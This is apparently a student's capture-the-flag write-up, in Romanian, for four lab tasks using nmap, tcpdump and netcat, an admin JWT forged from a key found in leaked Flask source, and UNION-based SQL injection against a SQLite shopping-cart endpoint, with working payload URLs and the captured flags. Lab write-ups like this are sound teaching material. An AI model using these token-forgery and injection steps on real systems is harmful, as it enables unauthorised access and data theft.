task1:
    Am verifiacat ce adrese ip avem si am bservat ca suntem conectati la server prin 10.128.x.x (ultimele doua cifre variaza cand ne reconectam).
    Apoi din hint am inteles ca cineva astepata un raspuns pe un port udp 18, am scanat reteaua folosind nmap (-sU este pentru a specifica tipul portului).
    Cautarea nea intors 6 hosti (adrese ip) dintre care doar unul avea portul deschis, iam trimis un mesaj oarecare cu utilitarul nc si am primit flagul.
    ip a s
    nmap -sU -p 18 10.128.1.0/24
    echo "mess..." | nc -u -w1 10.128.1.31 18
    SpeishFlag{Pe8Ell91jB57UsqrP97X9ufOaIVLqIH4}

task2:
    Am ivestigat cu tcmdump ca imi vin requesturi de la server pe un port anume(13452) care e inchis mereu
    folsid nc ascult pe port si observ un mesaj si dupa il rulez in background si observ ca dupa serverul trimite 
    requesturi pe alt port si repet asta pana imi apare flagul.
    tcpdump -i eth0 -nn
    nc -l 13452 &
    nc -l 13195 &
    nc -l 13195
    SpeishFlag{6640VTs9SqhNmxssb7WqnjvMT0hp0zOl}

task3:
    Am investigat intai reteaua cu nmap <reteaua>(10.128.11.0/24) si am observat ce porturi sunt pornite si pe ce adrese.
    doua din ele mi-au atras atentia ...187 si ...212 si primul e pentru taskul 4 si al doilea pentru taskul 3,
    am folosit scriptul pentru a acesa site ul (./webtunnel.sh 10.128.11.212 5000) si lam accesat pe browser local ca localhost:8080.
    apoi am observat ca in login este un fisier .js care este obfuscat am folost un tool pe net pentru desobfuscat. Si am observat
    ca mediul de backend serverului este python cu flusk din hint ul "Find snake's source? (make app crash, maybe?)" snake == python...
    deci fisierul sursa a serverul ar fi app.py (ceva foarte common pentru denumire a fisierelor sursa care folosec flusk).
    In fisierul sursei am observat ca avem key ul pentru tokenul de tip JWT si am observat cum se creaza tokenul (create_token).
    Pentru token avem nevoie de un username care este stocat intr un vectori de useri care este manipulat de api_register.

    Deci am folosit un tool ca curl pwntru a face un request :
    curl -X POST http://localhost:8080/api/register   -H "Content-Type: application/json"   -d '{ 
            "firstName": "Ion",
            "lastName": "Haruta",
            "email": "ion.haruta@gmail.com",
            "age": "21",
            "website": "https://www.ionhar.com",
            "username": "ionhar123",
            "password": "Sec@1235678!",
            "confirmPassword": "Sec@1235678!"
        }'
    {
    "success": "User registered successfully"
    }

    Am creat practic un cont (numele e un inside joke) si am folosit username ul pentru a face tokenul JWT, si am trimis o cerere de tip:
    curl -H "Cookie: accessToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImlvbmhhcjEyMyIsImlzQWRtaW4iOnRydWUsImV4cCI6MTczNTkzNjU4M30.MqMgCWSD6U_GWir3sKQPoH3IAU55lFCPDJGDPBpU81w" http://localhost:8080/profile

    Codul cu care am creat tokenul se afla in tok.py, e practic acelsi cod din app.py.

    Raspunsul a fost un cod html al pagini unde se afla flagul:
    SpeishFlag{nKjaC62zs0p2LnElyNo80KtHoDVZJYN9}

task4:
    Deci am observat ca cand adaugam ceva in cart se trimite GET request (am observat asta la seciunea Network din developer toolbox)
    acel request accesand ul are la url "http://localhost:8080/add_to_cart/1" deci de aici stim ca putem accesa si manipula cartul "/add_to_cart/..."

    Am incercat un simplu SQLI folosind SELECT ... si am observat o eroare data de codul py al cart ului in care am observat "conn = sqlite3.connect(DB_FILE)"
    ceea ce ne spune ca tipul database ului este sqlite, dupa o cautare scurta pe net am gasit ca denumirea tabelei de baza a database ului este sqlite_master.
    Am folosit UNION pentru a combina SELECT ul care era deja in cod "query = f"SELECT * FROM products WHERE id IN ({product_ids})"" cu o comanda de injectie.
    Ne stiind cate coloane are database ul am incercat intai una apoi doua cu NULL, pana la 5 cand am observat ca da eroare la calculul taxei,
    apoi am icercat sa schimb cate un NULL cu 0 si am observat ca ultimul e 0, apoi imi trebuia coloana care stocheza numele la obiectele din databse,
    aceiasi strategie si am observat ca a doua coloana e pentru name , comanda:
    http://localhost:8080/add_to_cart/) UNION SELECT NULL, name, NULL, NULL, 0 FROM sqlite_master --
    btw unfair tax (* 1.5) ....

    Observam ca apar 4 produse in cart ul nostru, unul care se numeste flagzMlRvXL. Am gasit pe net ca folosirea sql la coloale iti extrage coloana sql:
    Aceasta conține comanda CREATE TABLE, care îți dezvăluie schema tabelului (numele coloanelor și tipurile lor).
    Deci am folosit comanda in care am specificat numele:
    http://localhost:8080/add_to_cart/) UNION SELECT NULL, sql, NULL, NULL, 0 FROM sqlite_master WHERE name='flagzMlRvXL' --
 
    In dreptul flagului a aparut "CREATE TABLE flagzMlRvXL ( id INTEGER PRIMARY KEY AUTOINCREMENT, value8579 TEXT NOT NULL )" ce ne spune ca spune ca
    flagzMlRvXL are doua coloane id si value8579 deci mam folosit de ele si am accesat flagzMlRvXL prin comanda:
    http://localhost:8080/add_to_cart/) UNION SELECT id, value8579, NULL, NULL, 0 FROM flagzMlRvXL --

    mi au aparut mai multe produse in cos printre care era flaful:
    SpeishFlag{IDt7c707tisR2YilGe8rIwcIzRYlvPHk}